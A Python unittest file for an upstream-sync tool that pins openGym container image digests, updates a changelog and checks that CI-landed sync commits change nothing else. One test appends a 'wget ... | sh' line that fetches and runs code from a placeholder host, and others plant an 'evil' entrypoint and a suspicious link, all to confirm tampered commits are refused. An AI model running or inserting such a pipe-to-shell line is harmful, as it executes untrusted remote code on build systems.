"""Tests for tools/upstream_sync.py (the Upstream sync workflow, and CI's landing of its commits).

    .venv/bin/python -m unittest discover -s tools/tests -v
"""

from __future__ import annotations

import hashlib
import io
import json
import subprocess
import sys
import tempfile
import unittest
import urllib.error
from contextlib import redirect_stderr, redirect_stdout
from pathlib import Path

HERE = Path(__file__).resolve().parent
sys.path.insert(0, str(HERE.parent))

import addon_lint  # noqa: E402
import fixtures  # noqa: E402
import upstream_sync  # noqa: E402

API_142 = "sha256:" + "a" * 64
WEB_142 = "sha256:" + "b" * 64
DIGESTS = {"api": API_142, "web": WEB_142}


def index(*platforms: tuple[str, str], media: str = upstream_sync.INDEX_TYPES[0]) -> bytes:
    manifests = [{"platform": {"os": o, "architecture": a}} for o, a in platforms]
    # buildx adds attestation entries with an "unknown" platform; they must not count.
    manifests.append({"platform": {"os": "unknown", "architecture": "unknown"},
                      "annotations": {"vnd.docker.reference.type": "attestation-manifest"}})
    return json.dumps({"mediaType": media, "manifests": manifests}).encode()


BOTH = index(("linux", "amd64"), ("linux", "arm64"))


class FakeUpstream:
    """GitHub's latest-release endpoint and GHCR's token + manifest endpoints, in memory."""

    def __init__(self, tag="v1.4.2", manifests=None):
        self.tag = tag
        self.manifests = {"api": BOTH, "web": BOTH} if manifests is None else manifests

    def __call__(self, url: str, headers: dict[str, str]) -> bytes:
        if url.endswith("/releases/latest"):
            return json.dumps({"tag_name": self.tag, "draft": False, "prerelease": False}).encode()
        if "/token?" in url:
            return b'{"token": "t"}'
        for part, repo in upstream_sync.IMAGES.items():
            if f"/v2/{repo}/manifests/" in url:
                assert headers["Authorization"] == "Bearer t"
                body = self.manifests.get(part)
                if body is None:
                    raise urllib.error.HTTPError(url, 404, "not found", {}, None)
                return body
        raise AssertionError(url)


class Tree(unittest.TestCase):
    def setUp(self):
        self._tmp = tempfile.TemporaryDirectory()
        self.root = Path(self._tmp.name)
        fixtures.make_valid_tree(self.root)

    def tearDown(self):
        self._tmp.cleanup()

    def read(self, rel: str) -> str:
        return (self.root / rel).read_text(encoding="utf-8")


class Versions(unittest.TestCase):
    def test_numeric_not_lexical(self):
        self.assertGreater(upstream_sync.parse_version("1.4.10"), upstream_sync.parse_version("1.4.9"))

    def test_only_plain_releases(self):
        for bad in ("1.4", "1.4.2-rc1", "v1.4.2", "1.4.2; true", ""):
            with self.subTest(bad=bad), self.assertRaises(upstream_sync.SyncError):
                upstream_sync.parse_version(bad)

    def test_subject_patch_and_minor(self):
        self.assertEqual(upstream_sync.commit_subject("1.4.1", "1.4.2"), "Upstream: openGym 1.4.1 → 1.4.2")
        self.assertEqual(upstream_sync.commit_subject("1.4.2", "1.5.0"),
                         "Upstream: openGym 1.4.2 → 1.5.0 [minor]")
        # Upstream's major is our minor: the add-on's own major is ours to call.
        self.assertTrue(upstream_sync.commit_subject("1.9.0", "2.0.0").endswith(" [minor]"))


class Rewrite(Tree):
    def test_apply_pins_both_images_and_the_version(self):
        old, subject = upstream_sync.apply(self.root, "1.4.2", DIGESTS)
        self.assertEqual((old, subject), ("1.4.1", "Upstream: openGym 1.4.1 → 1.4.2"))
        self.assertEqual(addon_lint.upstream_version(self.root, []), "1.4.2")
        dockerfile = self.read(addon_lint.DOCKERFILE)
        self.assertIn(f"opengym-api:1.4.2@{API_142}", dockerfile)
        self.assertIn(f"opengym-web:1.4.2@{WEB_142}", dockerfile)
        # A reference in a comment is not a pin, and stays as it was.
        self.assertIn("# Moved off ghcr.io/duartesantos8/opengym-web:1.3.0", dockerfile)

    def test_only_the_pinned_lines_change(self):
        before = self.read(addon_lint.DOCKERFILE).splitlines()
        upstream_sync.apply(self.root, "1.4.2", DIGESTS)
        after = self.read(addon_lint.DOCKERFILE).splitlines()
        changed = [b for b, a in zip(before, after, strict=True) if a != b]
        self.assertEqual(len(changed), 3, changed)

    def test_refuses_an_older_or_equal_release(self):
        for version in ("1.4.1", "1.4.0"):
            with self.subTest(version=version), self.assertRaises(upstream_sync.SyncError):
                upstream_sync.apply(self.root, version, DIGESTS)

    def test_refuses_a_malformed_digest(self):
        with self.assertRaisesRegex(upstream_sync.SyncError, "opengym-web"):
            upstream_sync.apply(self.root, "1.4.2", {"api": API_142, "web": "sha256:abc"})

    def test_refuses_a_second_api_from_line(self):
        text = self.read(addon_lint.DOCKERFILE)
        text += f"FROM {fixtures.API} AS again\n"
        with self.assertRaisesRegex(upstream_sync.SyncError, "one FROM line for opengym-api, found 2"):
            upstream_sync.rewrite_dockerfile(text, "1.4.2", DIGESTS)

    def test_refuses_without_opengym_version(self):
        text = self.read(addon_lint.DOCKERFILE).replace("OPENGYM_VERSION=1.4.1", "OTHER=1")
        with self.assertRaisesRegex(upstream_sync.SyncError, "OPENGYM_VERSION"):
            upstream_sync.rewrite_dockerfile(text, "1.4.2", DIGESTS)


class Changelog(unittest.TestCase):
    ENTRY = upstream_sync.changelog_entry("1.4.2")

    def test_adds_an_unreleased_section_above_the_newest_release(self):
        out = upstream_sync.add_changelog_entry("# Changelog\n\n## 0.1.1\n\n- x\n", "1.4.2")
        self.assertEqual(out, f"# Changelog\n\n## Unreleased\n\n{self.ENTRY}\n\n## 0.1.1\n\n- x\n")

    def test_joins_an_existing_unreleased_section(self):
        text = "# Changelog\n\n## Unreleased\n\n- A fix.\n\n## 0.1.1\n\n- x\n"
        out = upstream_sync.add_changelog_entry(text, "1.4.2")
        self.assertEqual(out, f"# Changelog\n\n## Unreleased\n\n- A fix.\n{self.ENTRY}\n\n## 0.1.1\n\n- x\n")

    def test_fills_an_empty_unreleased_section(self):
        out = upstream_sync.add_changelog_entry("# C\n\n## Unreleased\n\n## 0.1.1\n", "1.4.2")
        self.assertEqual(out, f"# C\n\n## Unreleased\n\n{self.ENTRY}\n\n## 0.1.1\n")

    def test_idempotent(self):
        once = upstream_sync.add_changelog_entry("# C\n\n## 0.1.1\n", "1.4.2")
        self.assertEqual(upstream_sync.add_changelog_entry(once, "1.4.2"), once)

    def test_bump_version_promotes_it(self):
        import bump_version
        text = upstream_sync.add_changelog_entry("# C\n\n## 0.1.1\n\n- x\n", "1.4.2")
        out = bump_version.update_changelog(text, "0.1.2", "Upstream: openGym 1.4.1 → 1.4.2")
        self.assertIn(f"## 0.1.2\n\n{self.ENTRY}\n", out)
        self.assertNotIn("Maintenance release", out)


class Index(unittest.TestCase):
    def test_both_archs_required(self):
        self.assertTrue(upstream_sync.index_serves_archs(BOTH))
        self.assertFalse(upstream_sync.index_serves_archs(index(("linux", "amd64"))))
        self.assertFalse(upstream_sync.index_serves_archs(index(("linux", "arm64"))))

    def test_docker_manifest_list_counts(self):
        body = index(("linux", "amd64"), ("linux", "arm64"), media=upstream_sync.INDEX_TYPES[1])
        self.assertTrue(upstream_sync.index_serves_archs(body))

    def test_a_single_manifest_is_not_an_index(self):
        body = json.dumps({"mediaType": "application/vnd.oci.image.manifest.v1+json",
                           "manifests": [{"platform": {"os": "linux", "architecture": "amd64"}},
                                         {"platform": {"os": "linux", "architecture": "arm64"}}]})
        self.assertFalse(upstream_sync.index_serves_archs(body.encode()))
        self.assertFalse(upstream_sync.index_serves_archs(b"not json"))

    def test_digest_is_that_of_the_bytes(self):
        digest = upstream_sync.index_digest(FakeUpstream(), "api", "1.4.2")
        self.assertEqual(digest, "sha256:" + hashlib.sha256(BOTH).hexdigest())


class Check(Tree):
    HEAD = "c" * 40

    def check(self, upstream=None, tried=None):
        return upstream_sync.check(self.root, upstream or FakeUpstream(), "", tried or (lambda b: None),
                                   self.HEAD)

    def test_proposes_a_newer_release_with_both_images(self):
        out = self.check()
        digest = "sha256:" + hashlib.sha256(BOTH).hexdigest()
        self.assertEqual(out, {"current": "1.4.1", "version": "1.4.2", "action": "propose",
                               "branch": "upstream/opengym-1.4.2", "api_digest": digest,
                               "web_digest": digest, "subject": "Upstream: openGym 1.4.1 → 1.4.2"})

    def test_waits_for_images(self):
        for manifests in ({"api": BOTH, "web": None}, {"api": index(("linux", "amd64")), "web": BOTH}):
            with self.subTest(manifests=manifests):
                out = self.check(FakeUpstream(manifests=manifests))
                self.assertEqual(out["action"], "wait")

    def test_nothing_when_current(self):
        for tag in ("v1.4.1", "v1.4.0"):
            with self.subTest(tag=tag):
                self.assertEqual(self.check(FakeUpstream(tag=tag))["action"], "none")

    def test_notices_a_republished_digest_without_following_it(self):
        out = self.check(FakeUpstream(tag="v1.4.1"))
        self.assertEqual(out["action"], "none")
        self.assertIn("re-published opengym-api, opengym-web:1.4.1", out["reason"])

    def test_skips_a_version_already_tried_on_this_main(self):
        out = self.check(tried=lambda branch: self.HEAD)
        self.assertEqual(out["action"], "none")
        self.assertIn("already made from this main", out["reason"])

    def test_retries_once_main_moved(self):
        self.assertEqual(self.check(tried=lambda branch: "d" * 40)["action"], "propose")

    def test_rejects_an_odd_tag(self):
        for tag in ("v1.4.2-rc1", "1.4.2", "latest", None):
            with self.subTest(tag=tag), self.assertRaises(upstream_sync.SyncError):
                self.check(FakeUpstream(tag=tag))


class Landable(Tree):
    """A real git repository: main, and a candidate made the way the workflow makes one."""

    def setUp(self):
        super().setUp()
        self.git("init", "-q", "-b", "main")
        self.git("add", "-A")
        self.commit("main")
        self.base = self.rev("HEAD")

    def git(self, *args: str) -> str:
        return subprocess.run(["git", "-C", str(self.root), "-c", "user.name=t", "-c", "user.email=t@t",
                               *args], check=True, capture_output=True, text=True).stdout.strip()

    def rev(self, ref: str) -> str:
        return self.git("rev-parse", ref)

    def commit(self, message: str) -> str:
        self.git("commit", "-q", "--allow-empty", "-m", message)
        return self.rev("HEAD")

    def candidate(self, version: str = "1.4.2", extra=None) -> str:
        self.git("checkout", "-q", "-b", f"upstream/opengym-{version}", self.base)
        upstream_sync.apply(self.root, version, DIGESTS)
        if extra:
            extra()
        self.git("add", "-A")
        sha = self.commit("Upstream")
        self.git("checkout", "-q", "main")
        return sha

    def landable(self, candidate: str, base: str | None = None) -> int:
        err = io.StringIO()
        with redirect_stderr(err), redirect_stdout(io.StringIO()):
            try:
                code = upstream_sync.main(["--root", str(self.root), "landable",
                                           "--base", base or self.base, "--candidate", candidate])
            except SystemExit as exit_:
                code = exit_.code
        self.stderr = err.getvalue()
        return code

    def test_a_sync_commit_lands(self):
        self.assertEqual(self.landable(self.candidate()), 0)

    def test_main_moved(self):
        candidate = self.candidate()
        moved = self.commit("someone pushed to main")
        self.assertEqual(self.landable(candidate, base=moved), upstream_sync.MOVED)

    def test_another_file_is_refused(self):
        def extra():
            fixtures.write(self.root, "opengym/rootfs/usr/local/bin/opengym-entrypoint.sh", "evil\n")
        self.assertEqual(self.landable(self.candidate(extra=extra)), 1)
        self.assertIn("opengym-entrypoint.sh", self.stderr)

    def test_an_extra_dockerfile_line_is_refused(self):
        # The Dockerfile is code: a sync commit may change its pins and nothing else.
        def extra():
            path = self.root / addon_lint.DOCKERFILE
            path.write_text(path.read_text() + "RUN wget -O- http://example.invalid | sh\n")
        self.assertEqual(self.landable(self.candidate(extra=extra)), 1)
        self.assertIn("is not what a sync to 1.4.2 makes", self.stderr)

    def test_an_edited_changelog_is_refused(self):
        def extra():
            path = self.root / "opengym/CHANGELOG.md"
            path.write_text(path.read_text() + "\n[click me](http://example.invalid)\n")
        self.assertEqual(self.landable(self.candidate(extra=extra)), 1)
        self.assertIn("CHANGELOG.md", self.stderr)

    def test_two_commits_are_refused(self):
        candidate = self.candidate()
        self.git("checkout", "-q", candidate)
        on_top = self.commit("and one more")
        self.git("checkout", "-q", "main")
        self.assertEqual(self.landable(on_top), 1)

    def test_a_merge_is_refused(self):
        candidate = self.candidate()
        side = self.commit("side")
        self.git("checkout", "-q", "--detach", candidate)
        self.git("merge", "-q", "--no-edit", side)
        merged = self.rev("HEAD")
        self.git("checkout", "-q", "main")
        self.assertEqual(self.landable(merged, base=side), 1)

    def test_not_newer_is_refused(self):
        # A hand-made branch pinning the same release under other digests.
        self.git("checkout", "-q", "-b", "upstream/opengym-1.4.1", self.base)
        path = self.root / addon_lint.DOCKERFILE
        path.write_text(upstream_sync.rewrite_dockerfile(path.read_text(), "1.4.1", DIGESTS))
        self.git("add", "-A")
        candidate = self.commit("same version")
        self.git("checkout", "-q", "main")
        self.assertEqual(self.landable(candidate), 1)
        self.assertIn("not newer", self.stderr)


class Resolved(unittest.TestCase):
    def test_closes_versions_main_has_reached(self):
        issues = [
            {"number": 1, "title": upstream_sync.ISSUE_TITLE.format(version="1.4.2")},
            {"number": 2, "title": upstream_sync.ISSUE_TITLE.format(version="1.4.3")},
            {"number": 3, "title": "openGym 1.4.1 is great"},
            {"number": 4, "title": upstream_sync.ISSUE_TITLE.format(version="1.3.9")},
        ]
        self.assertEqual(upstream_sync.resolved(issues, "1.4.2"), [1, 4])


if __name__ == "__main__":
    unittest.main()
